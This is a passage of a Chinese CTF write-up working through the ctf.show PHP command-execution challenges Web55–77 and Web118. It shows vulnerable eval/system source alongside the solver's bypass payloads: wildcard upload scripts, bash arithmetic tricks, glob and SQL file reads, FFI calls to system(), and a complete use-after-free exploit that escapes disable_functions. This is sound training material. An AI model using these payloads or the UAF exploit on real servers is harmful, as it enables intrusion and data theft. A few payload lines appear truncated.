+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &quot;https://de0839d3-0ef6-490d-b638-b457f784391f.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;feng.txt&#x27;, b&#x27;cat flag.php&#x27;)&#125;)</span><br><span class="line">    if r.text.find(&quot;flag&quot;) &gt; 0:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="Web56"><a href="#Web56" class="headerlink" title="Web56"></a>Web56</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>又过滤了数字</p>
+<p>天要亡我啊！！</p>
+<p>但是回看上一道题</p>
+<p>这个脚本好像还能用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    url = &quot;https://c38e4ff5-357b-4246-bc23-174b37df5712.challenge.ctf.show/?c=.+/???/????????[@-[]&quot;</span><br><span class="line">    r = requests.post(url, files=&#123;&quot;file&quot;: (&#x27;feng.txt&#x27;, b&#x27;cat flag.php&#x27;)&#125;)</span><br><span class="line">    if r.text.find(&quot;flag&quot;) &gt; 0:</span><br><span class="line">        print(r.text)</span><br><span class="line">        break</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>改一个网址就行</p>
+<h4 id="Web57"><a href="#Web57" class="headerlink" title="Web57"></a>Web57</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 还能炫的动吗？</span><br><span class="line">//flag in 36.php</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c=$_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;, $c))&#123;</span><br><span class="line">        system(&quot;cat &quot;.$c.&quot;.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>过滤了字母、数字、分号和两个通配符</p>
+<p>取反</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">首先看等号左边(100) 的二进制表示为: 0110 0100 按位取反的意思就是每一位取反，0变1，1变0</span><br><span class="line">所以: ~100 的二进制表示为：1001 1011 所以等号左边=1001 1011</span><br><span class="line"></span><br><span class="line">再看右边</span><br><span class="line">-101. 一旦看到出现负数，那么这个数一定是按有符号数的规则来表示的。一个二进制数 按位取反并加一以后就可以得到它自己的负数的补码，也就是说： ~x+1=-x 所以，我们把101按位取反加一 先取反：</span><br><span class="line">~101=10011010 再加一： ~101+1=10011011=-101 所以等号右边=10011011=左边，所以等号成立。</span><br></pre></td></tr></table></figure>
+
+<p>双小括号 (( )) 是 Bash Shell 中专门用来进行整数运算的命令，它的效率很高，写法灵活，是企业运维中常用的运算命令。 通俗地讲，就是将数学运算表达式放在((和))之间。 表达式可以只有一个，也可以有多个，多个表达式之间以逗号,分隔。对于多个表达式的情况，以最后一个表达式的值作为整个 (( ))命令的执行结果。 可以使用$获取 (( )) 命令的结果，这和使用$获得变量值是类似的。 可以在 (( )) 前面加上$符号获取 (( )) 命令的执行结果，也即获取整个表达式的值。以 c&#x3D;$((a+b)) 为例，即将 a+b 这个表达式的运算结果赋值给变量 c。 注意，类似 c&#x3D;((a+b)) 这样的写法是错误的，不加$就不能取得表达式的结果。</p>
+<p>echo ${_} #返回上一次的执行结果<br>echo $(()) #0<br>echo $((<del>$(()))) #</del>0是-1<br>$(($((<del>$(())))$((</del>$(()))))) #$((-1-1))即$$((-2))是-2<br>echo $((<del>-37)) #</del>-37是36</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(($((~$(())))$((~$(())))))==-2</span><br></pre></td></tr></table></figure>
+
+
+<p>拆开看</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$(( $((~$(()))) $((~$(()))) ))</span><br><span class="line">$((~$(())))==-1 中间有两个所以是-2 是相加的 那中间有37个就是-37</span><br></pre></td></tr></table></figure>
+
+<p>然后取反就是36<br>playload：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))</span><br></pre></td></tr></table></figure>
+
+<p>好神奇，这个是看大佬的wp写的，所以其实有点看不懂，再看看</p>
+<h4 id="Web58-65"><a href="#Web58-65" class="headerlink" title="Web58-65"></a>Web58-65</h4><p>这些题一模一样</p>
+<p>都是</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=show_source(&#x27;flag.php&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>两者都是读取文件</p>
+<p>小本本记下来</p>
+<p>后者主要是要猜测目标文件，前者不需要</p>
+<h4 id="Web66"><a href="#Web66" class="headerlink" title="Web66"></a>Web66</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
+
+<p>多过滤了一个show_source</p>
+<p>所以我们尝试一下以下两种方式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST：c=print_r(scandir(&quot;/&quot;));</span><br><span class="line">POST: c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>同样是两种读取的方式</p>
+<h4 id="Web67"><a href="#Web67" class="headerlink" title="Web67"></a>Web67</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这道题尝试之后发现print_r不能用了，所以可以尝试一下两种方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=highlight_file(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web68"><a href="#Web68" class="headerlink" title="Web68"></a>Web68</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Warning: highlight_file() has been disabled for security reasons in /var/www/html/index.php on line 19</span><br></pre></td></tr></table></figure>
+
+<p>？？？？？？？？？？？？？？？</p>
+<p>也就是说没源码看了是吧，好好好，但是大概率是因为把highlight_file ban了</p>
+<p>所以可以使用一下以下方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_dump(scandir(&#x27;/&#x27;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web69-70"><a href="#Web69-70" class="headerlink" title="Web69-70"></a>Web69-70</h4><p>还是和上一题一样的，warning，笑死</p>
+<p>所以尝试一下上一题payload，发现过滤了var_dump</p>
+<p>所以可以尝试以下方法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br><span class="line">c=include(&#x27;/flag.txt&#x27;);</span><br></pre></td></tr></table></figure>
+
+<p>var_export函数使用方式和var_dump差不多</p>
+<h4 id="Web71"><a href="#Web71" class="headerlink" title="Web71"></a>Web71</h4><p>一定要去看看提示，直接写会看蒙掉的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>重点放在两个不认识的函数上</p>
+<p>ob_get_contents();&#x2F;&#x2F;得到缓冲区的数据。<br>ob_end_clean();&#x2F;&#x2F;会清除缓冲区的内容，并将缓冲区关闭，但不会输出内容</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>发现输出的一大堆问号，原来是源码中用函数将缓冲区的所有字符全部替换为问号，那么可以用exit()&#x2F;die()提前结束，这样就不会将字符替换为问号</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit();</span><br><span class="line">c=include(&quot;/flag.txt&quot;);die();</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url = &quot;http://64fe58eb-5766-484d-b8db-bd1f4b3ab1c2.chall.ctf.show/&quot;</span><br><span class="line"></span><br><span class="line">d = &#123;&#x27;c&#x27;: &#x27;include(&quot;/flag.txt&quot;);echo ~ob_get_contents();&#x27;&#125;</span><br><span class="line">s = requests.post(url, d).content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in s:</span><br><span class="line">    print(chr(~i&amp;0xff), end=&#x27;&#x27;)</span><br><span class="line"># 脚本来自群大佬阿狸</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web72"><a href="#Web72" class="headerlink" title="Web72"></a>Web72</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">ini_set(&#x27;display_errors&#x27;, 0);</span><br><span class="line">// 你们在炫技吗？</span><br><span class="line">if(isset($_POST[&#x27;c&#x27;]))&#123;</span><br><span class="line">        $c= $_POST[&#x27;c&#x27;];</span><br><span class="line">        eval($c);</span><br><span class="line">        $s = ob_get_contents();</span><br><span class="line">        ob_end_clean();</span><br><span class="line">        echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br><span class="line"> </span><br><span class="line">你要上天吗？</span><br></pre></td></tr></table></figure>
+
+<p>存在open_basedir，利用glob伪协议在筛选目录是不受open_basedir制约</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">exit();</span><br></pre></td></tr></table></figure>
+
+<p>发现</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240611170631533.png" alt="image-20240611170631533"></p>
+<p>之后我们需要绕过open_dir和disable_function</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php</span><br><span class="line">pwn(&quot;ls /;cat /flag0.txt&quot;);</span><br><span class="line"> </span><br><span class="line">function pwn($cmd) &#123;</span><br><span class="line">    global $abc, $helper, $backtrace;</span><br><span class="line">    class Vuln &#123;</span><br><span class="line">        public $a;</span><br><span class="line">        public function __destruct() &#123; </span><br><span class="line">            global $backtrace; </span><br><span class="line">            unset($this-&gt;a);</span><br><span class="line">            $backtrace = (new Exception)-&gt;getTrace(); # ;)</span><br><span class="line">            if(!isset($backtrace[1][&#x27;args&#x27;])) &#123; # PHP &gt;= 7.4</span><br><span class="line">                $backtrace = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    class Helper &#123;</span><br><span class="line">        public $a, $b, $c, $d;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function str2ptr(&amp;$str, $p = 0, $s = 8) &#123;</span><br><span class="line">        $address = 0;</span><br><span class="line">        for($j = $s-1; $j &gt;= 0; $j--) &#123;</span><br><span class="line">            $address &lt;&lt;= 8;</span><br><span class="line">            $address |= ord($str[$p+$j]);</span><br><span class="line">        &#125;</span><br><span class="line">        return $address;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function ptr2str($ptr, $m = 8) &#123;</span><br><span class="line">        $out = &quot;&quot;;</span><br><span class="line">        for ($i=0; $i &lt; $m; $i++) &#123;</span><br><span class="line">            $out .= sprintf(&#x27;%c&#x27;,$ptr &amp; 0xff);</span><br><span class="line">            $ptr &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">        return $out;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function write(&amp;$str, $p, $v, $n = 8) &#123;</span><br><span class="line">        $i = 0;</span><br><span class="line">        for($i = 0; $i &lt; $n; $i++) &#123;</span><br><span class="line">            $str[$p + $i] = sprintf(&#x27;%c&#x27;,$v &amp; 0xff);</span><br><span class="line">            $v &gt;&gt;= 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function leak($addr, $p = 0, $s = 8) &#123;</span><br><span class="line">        global $abc, $helper;</span><br><span class="line">        write($abc, 0x68, $addr + $p - 0x10);</span><br><span class="line">        $leak = strlen($helper-&gt;a);</span><br><span class="line">        if($s != 8) &#123; $leak %= 2 &lt;&lt; ($s * 8) - 1; &#125;</span><br><span class="line">        return $leak;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function parse_elf($base) &#123;</span><br><span class="line">        $e_type = leak($base, 0x10, 2);</span><br><span class="line"> </span><br><span class="line">        $e_phoff = leak($base, 0x20);</span><br><span class="line">        $e_phentsize = leak($base, 0x36, 2);</span><br><span class="line">        $e_phnum = leak($base, 0x38, 2);</span><br><span class="line"> </span><br><span class="line">        for($i = 0; $i &lt; $e_phnum; $i++) &#123;</span><br><span class="line">            $header = $base + $e_phoff + $i * $e_phentsize;</span><br><span class="line">            $p_type  = leak($header, 0, 4);</span><br><span class="line">            $p_flags = leak($header, 4, 4);</span><br><span class="line">            $p_vaddr = leak($header, 0x10);</span><br><span class="line">            $p_memsz = leak($header, 0x28);</span><br><span class="line"> </span><br><span class="line">            if($p_type == 1 &amp;&amp; $p_flags == 6) &#123; # PT_LOAD, PF_Read_Write</span><br><span class="line">                # handle pie</span><br><span class="line">                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;</span><br><span class="line">                $data_size = $p_memsz;</span><br><span class="line">            &#125; else if($p_type == 1 &amp;&amp; $p_flags == 5) &#123; # PT_LOAD, PF_Read_exec</span><br><span class="line">                $text_size = $p_memsz;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        if(!$data_addr || !$text_size || !$data_size)</span><br><span class="line">            return false;</span><br><span class="line"> </span><br><span class="line">        return [$data_addr, $text_size, $data_size];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_basic_funcs($base, $elf) &#123;</span><br><span class="line">        list($data_addr, $text_size, $data_size) = $elf;</span><br><span class="line">        for($i = 0; $i &lt; $data_size / 8; $i++) &#123;</span><br><span class="line">            $leak = leak($data_addr, $i * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;constant&#x27; constant check</span><br><span class="line">                if($deref != 0x746e6174736e6f63)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"> </span><br><span class="line">            $leak = leak($data_addr, ($i + 4) * 8);</span><br><span class="line">            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;</span><br><span class="line">                $deref = leak($leak);</span><br><span class="line">                # &#x27;bin2hex&#x27; constant check</span><br><span class="line">                if($deref != 0x786568326e6962)</span><br><span class="line">                    continue;</span><br><span class="line">            &#125; else continue;</span><br><span class="line"> </span><br><span class="line">            return $data_addr + $i * 8;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_binary_base($binary_leak) &#123;</span><br><span class="line">        $base = 0;</span><br><span class="line">        $start = $binary_leak &amp; 0xfffffffffffff000;</span><br><span class="line">        for($i = 0; $i &lt; 0x1000; $i++) &#123;</span><br><span class="line">            $addr = $start - 0x1000 * $i;</span><br><span class="line">            $leak = leak($addr, 0, 7);</span><br><span class="line">            if($leak == 0x10102464c457f) &#123; # ELF header</span><br><span class="line">                return $addr;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function get_system($basic_funcs) &#123;</span><br><span class="line">        $addr = $basic_funcs;</span><br><span class="line">        do &#123;</span><br><span class="line">            $f_entry = leak($addr);</span><br><span class="line">            $f_name = leak($f_entry, 0, 6);</span><br><span class="line"> </span><br><span class="line">            if($f_name == 0x6d6574737973) &#123; # system</span><br><span class="line">                return leak($addr + 8);</span><br><span class="line">            &#125;</span><br><span class="line">            $addr += 0x20;</span><br><span class="line">        &#125; while($f_entry != 0);</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    function trigger_uaf($arg) &#123;</span><br><span class="line">        # str_shuffle prevents opcache string interning</span><br><span class="line">        $arg = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line">        $vuln = new Vuln();</span><br><span class="line">        $vuln-&gt;a = $arg;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(stristr(PHP_OS, &#x27;WIN&#x27;)) &#123;</span><br><span class="line">        die(&#x27;This PoC is for *nix systems only.&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    $n_alloc = 10; # increase this value if UAF fails</span><br><span class="line">    $contiguous = [];</span><br><span class="line">    for($i = 0; $i &lt; $n_alloc; $i++)</span><br><span class="line">        $contiguous[] = str_shuffle(&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;);</span><br><span class="line"> </span><br><span class="line">    trigger_uaf(&#x27;x&#x27;);</span><br><span class="line">    $abc = $backtrace[1][&#x27;args&#x27;][0];</span><br><span class="line"> </span><br><span class="line">    $helper = new Helper;</span><br><span class="line">    $helper-&gt;b = function ($x) &#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    if(strlen($abc) == 79 || strlen($abc) == 0) &#123;</span><br><span class="line">        die(&quot;UAF failed&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # leaks</span><br><span class="line">    $closure_handlers = str2ptr($abc, 0);</span><br><span class="line">    $php_heap = str2ptr($abc, 0x58);</span><br><span class="line">    $abc_addr = $php_heap - 0xc8;</span><br><span class="line"> </span><br><span class="line">    # fake value</span><br><span class="line">    write($abc, 0x60, 2);</span><br><span class="line">    write($abc, 0x70, 6);</span><br><span class="line"> </span><br><span class="line">    # fake reference</span><br><span class="line">    write($abc, 0x10, $abc_addr + 0x60);</span><br><span class="line">    write($abc, 0x18, 0xa);</span><br><span class="line"> </span><br><span class="line">    $closure_obj = str2ptr($abc, 0x20);</span><br><span class="line"> </span><br><span class="line">    $binary_leak = leak($closure_handlers, 8);</span><br><span class="line">    if(!($base = get_binary_base($binary_leak))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t determine binary base address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($elf = parse_elf($base))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t parse ELF header&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($basic_funcs = get_basic_funcs($base, $elf))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get basic_functions address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    if(!($zif_system = get_system($basic_funcs))) &#123;</span><br><span class="line">        die(&quot;Couldn&#x27;t get zif_system address&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # fake closure object</span><br><span class="line">    $fake_obj_offset = 0xd0;</span><br><span class="line">    for($i = 0; $i &lt; 0x110; $i += 8) &#123;</span><br><span class="line">        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    # pwn</span><br><span class="line">    write($abc, 0x20, $abc_addr + $fake_obj_offset);</span><br><span class="line">    write($abc, 0xd0 + 0x38, 1, 4); # internal func type</span><br><span class="line">    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler</span><br><span class="line"> </span><br><span class="line">    ($helper-&gt;b)($cmd);</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在bp中抓包上传得到flag</p>
+<h4 id="Web73-74"><a href="#Web73-74" class="headerlink" title="Web73-74"></a>Web73-74</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)</span><br><span class="line">&#123;echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br></pre></td></tr></table></figure>
+
+<p>glob:</p>
+<p><img src="C:\Users\汪涵裕\AppData\Roaming\Typora\typora-user-images\image-20240611211039660.png" alt="image-20240611211039660"></p>
+<p>在此处是作为一个读取协议存在</p>
+<p>而&#x2F;*则代表了遍历文件</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=var_export(scandir(&#x27;/&#x27;));exit(); //发现根目录下有flagc.txt</span><br><span class="line">c=include(&#x27;/flagc.txt&#x27;);exit();</span><br></pre></td></tr></table></figure>
+
+<p>即先通过前者找到所需文件</p>
+<p>之后再通过include读取文件</p>
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php    //前面的?&gt;用来闭合&lt;?</span><br><span class="line">	$a=new DirectoryIterator(&quot;glob:///*&quot;);   //php使用glob遍历文件夹</span><br><span class="line">	foreach($a as $f) </span><br><span class="line">	&#123;</span><br><span class="line">		echo($f-&gt;__toString().&#x27; &#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	exit(0);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>使用数组遍历的方式遍历所有文件</p>
+<h4 id="Web75-76"><a href="#Web75-76" class="headerlink" title="Web75-76"></a>Web75-76</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-</span><br><span class="line">&gt;__toString().&#x27;&#x27;);&#125;exit(0);?&gt;</span><br><span class="line">#通过payload扫描 flag36.txt</span><br></pre></td></tr></table></figure>
+
+<p>所以来扫描吧</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line"> </span><br><span class="line">try &#123;</span><br><span class="line">    $dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">        &#x27;root&#x27;);</span><br><span class="line"> </span><br><span class="line">    foreach ($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row) &#123;</span><br><span class="line">        echo ($row[0]) . &quot;|&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    $dbh = null;</span><br><span class="line">&#125; catch (PDOException $e) &#123;</span><br><span class="line">    echo $e-&gt;getMessage();</span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br><span class="line">exit(0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>sql语句来绕过open_basedir和disable_function</p>
+<h4 id="Web77"><a href="#Web77" class="headerlink" title="Web77"></a>Web77</h4><ul>
+<li>命令执行最后一题，php7.4，基本上命令执行就告一段落了</li>
+</ul>
+<p>php7.4有什么玄机吗？</p>
+<p>FFI：</p>
+<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术</p>
+<p>所以我们可以通过system函数将flag写进一个新的文本中，然后访问文本</p>
+<p>方法一：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//首先是熟悉的确定flag位置和名称</span><br><span class="line">c=?&gt;&lt;?php </span><br><span class="line">	$a=new DirectoryIterator(&quot;glob:///*&quot;); </span><br><span class="line">	foreach($a as $f) </span><br><span class="line">	&#123; </span><br><span class="line">		echo($f-&gt;__toString().&#x27;  &#x27;);</span><br><span class="line">	&#125; </span><br><span class="line">	exit();</span><br><span class="line">?&gt;</span><br><span class="line">//FFI调用system函数</span><br><span class="line">c=</span><br><span class="line">$ffi=FFI :: cdef(&quot;int system(const char *command);&quot;);</span><br><span class="line">$a=&#x27;/readflag &gt; 1.txt&#x27;;</span><br><span class="line">$ffi-&gt;system($a);</span><br><span class="line">exit();</span><br><span class="line">//访问1.txt</span><br></pre></td></tr></table></figure>
+
+<p>方法二：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=</span><br><span class="line">$a=new DirectoryIterator(&quot;glob:///*&quot;);</span><br><span class="line">foreach($a as $f)&#123;</span><br><span class="line">echo $f.&quot;    &quot; ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    &quot;int system(const char *command);&quot;);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(&quot;/readflag &gt; 1.txt&quot;);</span><br><span class="line"></span><br><span class="line">exit();</span><br><span class="line">//访问1.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="Web118"><a href="#Web118" class="headerlink" title="Web118"></a>Web118</h4><p><strong>事先了解一下：</strong><br><a target="_blank" rel="noopener" href="https://blog.51cto.com/allenh/1695810">Linux 基础知识：Bash的内置变量</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9934595.html#title_0">常见 Bash 内置变量介绍</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@baba:~# echo $&#123;PWD&#125;</span><br><span class="line">/root</span><br><span class="line">root@baba:~# echo $&#123;PWD:1:1&#125;   //表示从第2（1+1）个字符开始的一个字符</span><br><span class="line">r</span><br><span class="line">root@baba:~# echo $&#123;PWD:0:1&#125;   //表示从第1（0+1）个字符开始的一个字符</span><br><span class="line">/</span><br><span class="line">root@baba:~# echo $&#123;PWD:~0:1&#125;  //表示从最后一个字符开始的一个字符</span><br><span class="line">t</span><br><span class="line">root@baba:~# echo $&#123;PWD:~A&#125;    //字母代表0</span><br><span class="line">t</span><br></pre></td></tr></table></figure>
+
+<p>所以本题可以通过该方式绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">code=$&#123;PATH:~A&#125;$&#123;PWD:~A&#125; ????.???</span><br></pre></td></tr></table></figure>
+
+<p>${PATH:~A}即为n，因为${PATH}通常为bin</p>
